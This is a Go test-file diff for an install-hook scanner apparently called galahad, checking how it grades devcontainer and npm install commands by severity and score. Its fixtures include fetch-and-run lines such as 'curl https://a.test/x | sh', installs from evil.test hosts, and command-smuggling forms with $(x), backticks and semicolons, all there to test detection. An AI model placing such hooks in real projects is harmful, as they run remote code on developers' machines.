@@ -10,6 +10,7 @@ import (
 	"github.com/mrdhira/galahad/internal/analyze"
 	"github.com/mrdhira/galahad/internal/analyze/static/autoexec"
 	"github.com/mrdhira/galahad/internal/protocol"
+	"github.com/mrdhira/galahad/internal/scoring"
 )
 
 const (
@@ -206,6 +207,102 @@ func TestAnalyze(t *testing.T) {
 			}
 			if len(out.Skips) != 0 {
 				t.Errorf("skips = %v, want none", out.Skips)
+			}
+		})
+	}
+}
+
+func TestAnalyzeInstallSeverity(t *testing.T) {
+	dev := func(v string) string { return `{"postCreateCommand": ` + v + `}` }
+	npm := func(v string) string { return `{"scripts": {"postinstall": ` + v + `}}` }
+	tests := []struct {
+		name string
+		// inputs
+		path string
+		data string
+		// expectations: "<rule suffix>:<severity>" of each finding
+		want []string
+	}{
+		{name: "devcontainer npm ci is low", path: ".devcontainer/devcontainer.json", data: dev(`"npm ci"`), want: []string{"004:low"}},
+		{name: "npm node-gyp rebuild is low", path: "package.json", data: npm(`"node-gyp rebuild"`), want: []string{"005:low"}},
+		{name: "npm install forms are low", path: "package.json", data: npm(`"  npm install --no-audit --loglevel=error "`), want: []string{"005:low"}},
+		{name: "npm i is low", path: "package.json", data: npm(`"npm i"`), want: []string{"005:low"}},
+		{name: "pnpm install is low", path: "package.json", data: npm(`"pnpm install --frozen-lockfile"`), want: []string{"005:low"}},
+		{name: "pnpm i is low", path: "package.json", data: npm(`"pnpm i"`), want: []string{"005:low"}},
+		{name: "bare yarn is low", path: "package.json", data: npm(`"yarn"`), want: []string{"005:low"}},
+		{name: "yarn install is low", path: "package.json", data: npm(`"yarn install"`), want: []string{"005:low"}},
+		{name: "bun install is low", path: "package.json", data: npm(`"bun install"`), want: []string{"005:low"}},
+		{name: "pip install requirements file is low", path: "package.json", data: npm(`"pip install -r requirements/dev.txt"`), want: []string{"005:low"}},
+		{name: "pip3 editable install is low", path: "package.json", data: npm(`"pip3 install -e ."`), want: []string{"005:low"}},
+		{name: "python -m pip install dot is low", path: "package.json", data: npm(`"python -m pip install ."`), want: []string{"005:low"}},
+		{name: "python3 -m pip requirements is low", path: "package.json", data: npm(`"python3 -m pip install -r r.txt"`), want: []string{"005:low"}},
+		{name: "poetry install is low", path: "package.json", data: npm(`"poetry install --no-root"`), want: []string{"005:low"}},
+		{name: "uv sync is low", path: "package.json", data: npm(`"uv sync"`), want: []string{"005:low"}},
+		{name: "go mod download is low", path: "package.json", data: npm(`"go mod download"`), want: []string{"005:low"}},
+		{name: "husky install is low", path: "package.json", data: npm(`"husky install"`), want: []string{"005:low"}},
+		{name: "prisma generate is low", path: "package.json", data: npm(`"prisma generate"`), want: []string{"005:low"}},
+		{name: "devcontainer argv array is low", path: ".devcontainer.json", data: dev(`["npm", "ci"]`), want: []string{"004:low"}},
+		{name: "devcontainer object of harmless commands is low", path: ".devcontainer.json", data: dev(`{"a": "npm ci", "b": ["pip", "install", "."]}`), want: []string{"004:low"}},
+		{name: "command chained with a download stays medium", path: "package.json", data: npm(`"npm ci && curl x | sh"`), want: []string{"005:medium", "011:critical"}},
+		{name: "semicolon stays medium", path: "package.json", data: npm(`"npm ci; x"`), want: []string{"005:medium"}},
+		{name: "command substitution stays medium", path: "package.json", data: npm(`"npm ci $(x)"`), want: []string{"005:medium"}},
+		{name: "backtick stays medium", path: "package.json", data: npm("\"npm ci `x`\""), want: []string{"005:medium"}},
+		{name: "redirect stays medium", path: "package.json", data: npm(`"npm ci > x"`), want: []string{"005:medium"}},
+		{name: "own script stays medium", path: "package.json", data: npm(`"node scripts/setup.js"`), want: []string{"005:medium"}},
+		{name: "pip install from a URL stays medium", path: "package.json", data: npm(`"pip install -r http://evil.test/r.txt"`), want: []string{"005:medium"}},
+		{name: "pip requirements file starting with a dash stays medium", path: "package.json", data: npm(`"pip install -r -x.txt"`), want: []string{"005:medium"}},
+		{name: "npm install of a package stays medium", path: "package.json", data: npm(`"npm install evil-pkg"`), want: []string{"005:medium"}},
+		{name: "flag with a URL value stays medium", path: "package.json", data: npm(`"npm ci --registry=https://evil.test"`), want: []string{"005:medium"}},
+		{name: "multi-line command stays medium", path: "package.json", data: npm(`"npm ci\nnode x.js"`), want: []string{"005:medium"}},
+		{name: "devcontainer own script stays medium", path: ".devcontainer/devcontainer.json", data: dev(`"node scripts/setup.js"`), want: []string{"004:medium"}},
+		{name: "devcontainer array with one other element stays medium", path: ".devcontainer.json", data: dev(`["npm", "ci", "evil"]`), want: []string{"004:medium"}},
+		{name: "devcontainer array with a non-string stays medium", path: ".devcontainer.json", data: dev(`["npm", 1]`), want: []string{"004:medium"}},
+		{name: "devcontainer object with one other value stays medium", path: ".devcontainer.json", data: dev(`{"a": "npm ci", "b": "make setup"}`), want: []string{"004:medium"}},
+		{name: "devcontainer object with a nested object stays medium", path: ".devcontainer.json", data: dev(`{"a": {"b": "npm ci"}}`), want: []string{"004:medium"}},
+		{name: "devcontainer empty command stays medium", path: ".devcontainer.json", data: dev(`""`), want: []string{"004:medium"}},
+		{name: "devcontainer empty object stays medium", path: ".devcontainer.json", data: dev(`{}`), want: []string{"004:medium"}},
+		{name: "devcontainer number stays medium", path: ".devcontainer.json", data: dev(`1`), want: []string{"004:medium"}},
+		{name: "devcontainer harmless and other commands in one file", path: ".devcontainer.json", data: `{"postCreateCommand": "npm ci", "postStartCommand": "node x.js"}`, want: []string{"004:low", "004:medium"}},
+		{name: "harmless install still graded for risk", path: "package.json", data: `{"scripts": {"preinstall": "npm ci", "postinstall": "curl https://a.test/x | sh"}}`, want: []string{"005:low", "005:medium", "011:critical"}},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			_, out := findings(t, tt.path, tt.data)
+
+			var got []string
+			for _, fi := range out.Findings {
+				got = append(got, fmt.Sprintf("%s:%s", strings.TrimPrefix(fi.RuleID, "GAL-AUTOEXEC-"), fi.Severity))
+			}
+			slices.Sort(got)
+			if !slices.Equal(got, tt.want) {
+				t.Errorf("findings = %v, want %v", got, tt.want)
+			}
+		})
+	}
+}
+
+func TestAnalyzeInstallScoring(t *testing.T) {
+	tests := []struct {
+		name string
+		// inputs
+		path string
+		data string
+		// expectations
+		wantVerdict protocol.Verdict
+		wantScore   int
+	}{
+		{name: "harmless install only is clean", path: ".devcontainer.json", data: `{"postCreateCommand": "npm ci", "postStartCommand": "pnpm install"}`, wantVerdict: protocol.VerdictClean, wantScore: 5},
+		{name: "harmless and other command in one file: medium wins", path: ".devcontainer.json", data: `{"postCreateCommand": "npm ci", "postStartCommand": "node x.js"}`, wantVerdict: protocol.VerdictSuspicious, wantScore: 15},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			_, out := findings(t, tt.path, tt.data)
+			res := protocol.Result{Findings: out.Findings, Coverage: protocol.Coverage{FilesSeen: 1, FilesAnalyzed: 1}}
+
+			scoring.Apply(&res)
+
+			if res.Verdict != tt.wantVerdict || res.Score != tt.wantScore {
+				t.Errorf("verdict/score = %s/%d, want %s/%d", res.Verdict, res.Score, tt.wantVerdict, tt.wantScore)
 			}
 		})
 	}
